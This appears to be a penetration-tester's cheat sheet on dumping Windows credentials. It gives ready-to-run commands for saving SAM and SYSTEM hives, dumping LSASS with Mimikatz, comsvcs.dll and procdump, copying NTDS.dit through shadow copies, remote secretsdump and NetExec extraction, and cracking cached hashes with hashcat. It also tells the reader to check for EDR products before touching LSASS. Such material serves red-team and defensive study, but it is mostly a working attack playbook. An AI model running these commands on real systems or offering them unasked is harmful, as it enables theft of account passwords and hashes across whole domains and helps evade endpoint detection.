# Windows Credential Dumping

!!! tip ""
    If LSASS is protected (PPL enabled), dump SAM/SYSTEM offline: `reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak` then run `impacket-secretsdump` locally. No process injection required.

!!! warning "Watch out"
    LSASS dumps trigger EDR on most enterprise endpoints. Check for AV/EDR first with `tasklist` — look for CrowdStrike, SentinelOne, Defender, Carbon Black processes before touching LSASS.

---

## Dump SAM Database (Local Accounts)

### Via Registry Save

```powershell
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
```

Extract hashes (on attacker machine):

```bash
impacket-secretsdump -sam sam -system system LOCAL
pypykatz registry --sam sam system
```

### Via Mimikatz

```powershell
mimikatz # token::elevate
mimikatz # lsadump::sam
```

---

## Dump LSASS (Plaintext Creds & Hashes)

### Mimikatz (Direct)

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Minidump via comsvcs.dll (LOL Binary)

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"    # get PID
rundll32.exe comsvcs.dll, MiniDump <pid> C:\Temp\lsass.dmp full
```

Parse offline:

```bash
pypykatz lsa minidump lsass.dmp
```

### Procdump (Sysinternals)

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Then parse with Mimikatz or pypykatz.

### Task Manager (GUI — when you have RDP)

Open Task Manager → Details tab → right-click `lsass.exe` → Create Dump File. Transfer `.dmp` to attacker machine and parse offline.

---

## Dump NTDS.DIT (Domain Controller — All Hashes)

### Via Shadow Copy (Preferred)

```powershell
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\system
```

Transfer and extract:

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### Via NetExec (Remote — if you have DA creds)

```bash
nxc smb 10.10.10.10 -u Administrator -p 'Password1' --ntds
```

---

## Cached Credentials (DCC2)

Domain Cached Credentials stored locally for offline login. Crackable but slow (hashcat mode 2100).

```powershell
mimikatz # sekurlsa::cache
mimikatz # sekurlsa::credman     # Windows Credential Manager
```

```bash
hashcat -m 2100 dcc2.hash rockyou.txt
```

---

## Remote SAM Dump (If You Have Admin Creds)

```bash
impacket-secretsdump CORP/Administrator:'Password1'@10.10.10.10
impacket-secretsdump Administrator@10.10.10.10 -hashes :<ntlm-hash>
```
